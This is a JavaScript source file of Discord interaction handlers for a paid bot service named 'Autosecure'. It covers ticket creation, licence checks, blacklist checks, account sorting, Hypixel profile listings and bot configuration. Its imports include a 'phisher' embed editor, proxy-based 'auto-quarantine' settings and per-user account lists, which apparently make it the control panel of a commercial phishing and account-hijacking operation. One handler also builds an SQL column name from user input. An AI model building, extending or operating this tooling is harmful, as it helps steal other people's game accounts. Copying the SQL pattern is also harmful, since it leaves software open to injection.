const isblacklisted = require('../../../db/blacklist');
const getButtons = require('../../utils/getButtons');
const { queryParams } = require('../../../db/database');
const accountsmsg = require('../../../autosecure/utils/accounts/accountsmsg');
const config = require("../../../config.json");
const { ChannelType, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const isOwner = require('../../../db/isOwner');
const access = require("../../../db/access");
const listProfile = require("../../../autosecure/utils/hypixelapi/listProfile")
const showbotmsg = require("../../../autosecure/utils/bot/showbotmsg")
const handlenewbot = require("../../../autosecure/utils/bot/newbot");
const cosmeticmsg = require('../../../autosecure/utils/cosmetics/cosmeticmsg')
const listConfiguration = require('../../../autosecure/utils/settings/listConfiguration');
const {
    showembedphisher,
    showembederror,
    showembedautosec,
    showeditdm
} = require("../../../autosecure/utils/responses/showeditembeds");
const { client } = require('../../controllerbot');
const { logTicketCreate } = require('../../utils/activityLogger');



/// Embed selector

async function showembedsmainbot(client, interaction, botnumber, userid) {
//  console.log(`Button number: ${botnumber} from showembedsmainbot`)
    const selectedValue = interaction.values[0];
    if (selectedValue === 'phisher') {
        await showembedphisher(client, interaction, botnumber, userid);
    } else if (selectedValue === 'error') {
        await showembederror(client, interaction, botnumber, userid);
    } else if (selectedValue === 'autosecure') {
        await showembedautosec(client, interaction, botnumber, userid);
    } else if (selectedValue === "dmembeds") {
        await showeditdm(client, interaction, botnumber, userid);
    }
}





async function handlesecureconfig(interaction) {
        const selections = interaction.values;
        const userId = interaction.user.id
    
        try {
        const hasAutoquarantine = selections.some(selected => {
            const parts = selected.split("|");
            return parts[1] === "autoquarantine" && (parts[2] === "1" || parts[2] === 1);
        });
    
            let canUpdateAutoquarantine = true;
    
            if (hasAutoquarantine) {
                const proxyCheck = await queryParams(
                    `SELECT proxy FROM proxies WHERE user_id = ?`,
                    [interaction.user.id]
                );
    
                if (!proxyCheck || proxyCheck.length === 0) {
                    const newMessage = await listConfiguration(userId);
                    newMessage.content = "Couldn't turn on Auto-Quarantine! Please setup proxies in `/quarantine`.";
                    await interaction.update(newMessage);
                    canUpdateAutoquarantine = false;
                }
            }
    
            for (const selected of selections) {
                const [_, table, newsetting] = selected.split("|");
    
                if (table === "autoquarantine" && !canUpdateAutoquarantine) {
                    continue;
                }
    
                await queryParams(
                    `UPDATE secureconfig SET ${table} = ? WHERE user_id = ?`,
                    [newsetting, userId]
                );
            }
    
            if (canUpdateAutoquarantine) {
                const newMessage = await listConfiguration(userId);
                await interaction.update(newMessage);
            }
    
        } catch (err) {
            console.error("Error updating features:", err);
            await interaction.editReply({
                content: `❌ Something went wrong while updating your settings.`,
                embeds: [],
                components: []
            });
        }
    }



    async function handlecosmetics(client, interaction, params) {
  let username = interaction.customId.split('|')[1]  
  let type = interaction.values[0]
  let msg = await cosmeticmsg(username, type)
  return interaction.update(msg)
}

async function handleprofilesplit(client, interaction){
    const selectedValue = interaction.values[0];
    const [action, username, profile, sensored] = selectedValue.split("|");
    
    let sensoredvalue = sensored === '1' ? true : false;

    interaction.update(await listProfile(username, { sensored: sensoredvalue, list: "skyblock", ping: "", profile: profile }));
}

async function checkBlacklist(interaction) {
  const blacklisted = await isblacklisted(interaction.user.id);

  if (blacklisted.blacklisted) {
    const embed = new EmbedBuilder()
      .setColor('#d22b2b')
      .setDescription(`### You're blacklisted from using Autosecure\n\nReason: ${blacklisted.reason}`);
    await interaction.reply({ embeds: [embed], ephemeral: true });
    return true;
  }
  return false;
}

async function handleSortAccounts(client, interaction, params) {
  const [userId] = params;
  const selectedValue = interaction.values[0];

  const existing = await client.queryParams(
    `SELECT 1 FROM settings WHERE user_id = ?`,
    [userId]
  );

  if (existing.length > 0) {
    await client.queryParams(
      `UPDATE settings SET sortingtype = ? WHERE user_id = ?`,
      [selectedValue, userId]
    );
  } else {
    await client.queryParams(
      `INSERT INTO settings (user_id, sortingtype) VALUES (?, ?)`,
      [userId, selectedValue]
    );
  }

  const msg = await accountsmsg(userId, 1); 
  await interaction.update(msg);
}

async function handletickets(client, interaction, params) {
  const selected = interaction.values[0];
  let purchase = selected === "purchase";
  let license = selected === "license";
  let suggestion = selected === "suggestion";
  const userId = interaction.user.id;

  // Get category for this ticket type
  let categoryId = null;
  if (config.ticketCategories && typeof config.ticketCategories === 'object') {
    // Use specific category for this ticket type, or fall back to default
    categoryId = config.ticketCategories[selected] || config.ticketCategories.default;
  }
  
  // Fall back to old ticketcategory if new system not configured
  if (!categoryId) {
    categoryId = config.ticketcategory;
  }

  try {
    for (const [existingUserId, channelId] of client.tickets) {
      if (existingUserId === userId) {
        const existingChannel = await client.channels.fetch(channelId).catch(() => null);
        
        if (existingChannel) {
          return await interaction.reply({
            content: `❌ You already have an open ticket: <#${channelId}>\nPlease close it or wait for it to be resolved before creating a new one!`,
            ephemeral: true
          });
        } else {
          client.tickets.delete(existingUserId);
        }
      }
    }

    const countQuery = await queryParams(`SELECT ticketcount FROM controlbot WHERE id = 1`);
    let currentCount = countQuery?.[0]?.ticketcount || 0;
    const newTicketNumber = currentCount + 1;
    
    await queryParams(`UPDATE controlbot SET ticketcount = ? WHERE id = 1`, [newTicketNumber]);
    let date = Date.now()
    const guild = interaction.guild;
    
    // Validate and fetch category channel
    let categoryChannel = null;
    if (categoryId) {
      try {
        const fetchedCategory = await guild.channels.fetch(categoryId).catch(() => null);
        if (fetchedCategory && fetchedCategory.type === ChannelType.GuildCategory) {
          categoryChannel = fetchedCategory;
        } else {
          console.warn(`[TICKET] Category ${categoryId} is not a valid category channel`);
        }
      } catch (err) {
        console.warn(`[TICKET] Could not fetch category ${categoryId}:`, err.message);
      }
    }
    
    // Filter out invalid owner IDs (must be valid Discord snowflake format)
    const validOwners = config.owners.filter(ownerId => {
      // Discord snowflakes are 17-19 digit numbers
      return typeof ownerId === 'string' && /^\d{17,19}$/.test(ownerId);
    });

    // Build permission overwrites
    const permissionOverwrites = [
      {
        id: guild.id,
        deny: [PermissionsBitField.Flags.ViewChannel]
      },
      {
        id: userId,
        allow: [
          PermissionsBitField.Flags.ViewChannel,
          PermissionsBitField.Flags.SendMessages,
          PermissionsBitField.Flags.AttachFiles
        ]
      }
    ];

    // Add valid owners to permission overwrites
    for (const ownerId of validOwners) {
      try {
        // Verify the user exists in the guild before adding
        const ownerMember = await guild.members.fetch(ownerId).catch(() => null);
        if (ownerMember) {
          permissionOverwrites.push({
            id: ownerId,
            allow: [
              PermissionsBitField.Flags.ViewChannel,
              PermissionsBitField.Flags.SendMessages,
              PermissionsBitField.Flags.ManageMessages
            ]
          });
        }
      } catch (err) {
        console.warn(`[TICKET] Could not add owner ${ownerId} to ticket permissions:`, err.message);
      }
    }

    // Build channel creation options
    const channelOptions = {
      name: `ticket-${newTicketNumber}`,
      topic: `Creator: @${interaction.user.username} | Category: ${selected} | Date: ${date}`,
      type: ChannelType.GuildText,
      permissionOverwrites: permissionOverwrites
    };

    // Only add parent if category is valid
    if (categoryChannel) {
      channelOptions.parent = categoryChannel;
    }

    const ticketChannel = await guild.channels.create(channelOptions);

    client.tickets.set(userId, ticketChannel.id);

    // Log ticket creation
    await logTicketCreate(client, userId, interaction.user.tag, selected, ticketChannel.id).catch(() => {});

    const actionRow = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setCustomId(`addtoticket`)
          .setLabel('Add user to ticket')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`kick|${userId}`)
          .setLabel('Kick')
          .setStyle(ButtonStyle.Danger),
        new ButtonBuilder()
          .setCustomId(`ban|${userId}`)
          .setLabel('Ban')
          .setStyle(ButtonStyle.Danger),
        new ButtonBuilder()
          .setCustomId(`close|${userId}|${selected}`)
          .setLabel('Close Ticket')
          .setStyle(ButtonStyle.Primary)
      );

    let sentMessage;

    if (purchase) {
      const purchaseEmbed = new EmbedBuilder()
        .setTitle(`Purchase Ticket #${newTicketNumber}`)
        .setDescription(`This ticket is only meant for purchasing with an alternative payment method.\n\nYou can always purchase Autosecure using Litecoin`)
        .setColor(13158600)
        .setFooter({ 
          text: `Created by ${interaction.user.tag}`, 
          iconURL: interaction.user.displayAvatarURL() 
        });

      const purchaseRow = new ActionRowBuilder()
        .addComponents(
          new ButtonBuilder()
            .setLabel('Purchase with Litecoin')
            .setURL(config.shoplink)
            .setStyle(ButtonStyle.Link)
        );

      sentMessage = await ticketChannel.send({ 
        content: `${interaction.user}`,
        embeds: [purchaseEmbed],
        components: [actionRow, purchaseRow]
      });

    } else if (license) {
      const licenseEmbed = new EmbedBuilder()
        .setTitle(`License Recovery Ticket #${newTicketNumber}`)
        .setDescription(`To recover your Autosecure access, please use the \`/recover\` command in this ticket along with the **latest license key** you purchased.\n\nIf you get a dm from the bot, your access was succesfully recovered. Please close the ticket in that case.\n\nIf you face other issues, feel free to ask here.`)
        .setColor(13158600)
        .setFooter({ 
          text: `Created by ${interaction.user.tag}`, 
          iconURL: interaction.user.displayAvatarURL() 
        });

      sentMessage = await ticketChannel.send({ 
        content: `${interaction.user}`,
        embeds: [licenseEmbed],
        components: [actionRow]
      });

    } else {
      const desp = suggestion
      ? `Support will be with you shortly.\n\n**Ticket Type:** ${selected}\nPlease do /guides if you have any general questions and close the ticket!`
      : `Support will be with you shortly.\n\n**Ticket Type:** ${selected}`;
      const ticketEmbed = new EmbedBuilder()
        .setTitle(`Ticket #${newTicketNumber}`)
        .setDescription(desp)
        .setColor(13158600)
        .setFooter({ 
          text: `Created by ${interaction.user.tag}`, 
          iconURL: interaction.user.displayAvatarURL() 
        });

      sentMessage = await ticketChannel.send({ 
        content: `${interaction.user}`,
        embeds: [ticketEmbed],
        components: [actionRow]
      });
    }

    await sentMessage.pin().catch(error => {
      console.error(`Failed to pin message in ticket ${ticketChannel.id}:`, error);
    });

    await interaction.reply({
      content: `✅ Created a ticket for you! ${ticketChannel}`,
      ephemeral: true
    });

  } catch (error) {
    console.error(`[${new Date().toISOString()}] Error creating ticket for ${interaction.user.tag}:`, error);
    await interaction.reply({
      content: '❌ Failed to create ticket. Please try again or contact support.',
      ephemeral: true
    });
  }
}

async function handlesnewbot(interaction){
    if (!await access(interaction.user.id)) {
      return interaction.reply({
        content: `You don't have access anymore, please purchase a new license!`,
        ephemeral: true,
        });
      }
        const userid = interaction.values[0].split('|')[1];
        const botnumber = interaction.values[0].split('|')[2];
        await handlenewbot(interaction, userid, botnumber);
        return;
}


async function handlesshowbot(interaction){
    const userid = interaction.values[0].split('|')[1];
    const botnumber = interaction.values[0].split('|')[2];
      if (!await access(interaction.user.id)) {
        return interaction.reply({
          content: `You don't have access anymore, rough!`,
          ephemeral: true,
          });
        }
      interaction.reply(await showbotmsg(userid, botnumber, userid, client))
      return;
}

module.exports = {
    handlesecureconfig,
    handlecosmetics,
    handleprofilesplit,
    checkBlacklist,
    handleSortAccounts,
    handletickets,
    handlesnewbot,
    handlesshowbot,
    showembedsmainbot
};